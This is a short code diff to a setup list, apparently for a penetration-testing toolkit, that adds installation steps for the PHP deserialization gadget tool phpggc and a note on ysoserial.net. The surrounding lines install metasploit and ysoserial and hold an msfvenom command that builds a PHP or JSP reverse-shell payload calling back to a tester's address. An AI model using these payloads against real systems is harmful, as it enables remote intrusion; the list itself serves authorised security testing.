@@ -96,6 +96,8 @@ window.SETUP = [
   { group: "payload generators", note: "msfvenom (metasploit-framework) and ysoserial are allowed payload generators — not autopwn.", cmds: [
     { tool: "apt", cmd: "sudo apt install -y metasploit-framework    # provides msfvenom" },
     { tool: "ysoserial", cmd: "sudo mkdir -p /opt && wget -qO /opt/ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar   # java deser gadgets" },
+    { tool: "phpggc", cmd: "git clone -q https://github.com/ambionics/phpggc /opt/phpggc && sudo ln -sf /opt/phpggc/phpggc /usr/local/bin/phpggc   # php deser gadget chains" },
+    { tool: "ysoserial.net", cmd: "# .NET: grab a release from github.com/pwntester/ysoserial.net (run under mono/Windows) for BinaryFormatter/ViewState" },
     { tool: "msfvenom", cmd: "msfvenom -p php/reverse_php LHOST={tester_ip} LPORT={tester_port} -f raw -o shell.php   # or -p java/jsp_shell_reverse_tcp -f war -o s.war" }
   ]},
   { group: "WordPress / CMS", cmds: [
